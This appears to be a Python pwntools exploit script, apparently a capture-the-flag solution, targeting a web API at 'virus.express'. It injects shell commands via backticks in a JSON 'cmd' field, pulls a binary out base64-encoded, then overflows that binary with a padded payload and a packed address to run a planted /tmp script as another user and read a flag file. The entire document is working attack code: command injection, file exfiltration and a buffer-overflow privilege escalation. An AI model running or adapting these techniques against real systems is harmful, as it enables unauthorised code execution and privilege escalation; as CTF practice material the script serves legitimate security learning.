#!/usr/bin/python
from pwn import *
import requests, json, base64

BASEURL = "http://virus.express/api"

SESSION = requests.Session()
COOKIE = {"t19userid":"YOURCOOKIEHERE"}

def Post(url, data):
	return SESSION.post(format(url),data, cookies=COOKIE).text

def execute_cmd(cmd):
	js = { 
		"file" : 
			{
				"hash" : "f31a20cbe28c22ad7e6c46b989804e2c", 
				"name2": "2" 
			},
		"cmd" : "echo `%s`" % cmd
	}

	response = Post(BASEURL, json.dumps(js))

	print response

	return response

def leak_dbclient():
	response = execute_cmd("cat /home/rubyist/dbclient | base64")

	response = response.split(",")[1].split(":")[1].split('"')[1]

	with open("dbclient", "wb") as f:
		f.write(base64.b64decode(response))

	print response

def execute_as_ben(cmd):
	payload = "/tmp/s&&"
	payload += "#"*(48-len(payload))
	payload += p64(0x4141414141432a68)
	payload  = payload.ljust(80, "A")

	execute_cmd('echo "#/bin/sh\n%s" > /tmp/s' % cmd)	
	execute_cmd("chmod +x /tmp/s")	
	execute_cmd('/home/ben/dbclient "%s" abc' % payload)
	execute_cmd("rm /tmp/s")

def exploit():
	SESSION.headers.update({ "Content-Type" : "application/json"})
			
	execute_as_ben("cat /home/ben/.flag.advanced")
	
	return

if __name__ == "__main__":
	exploit()
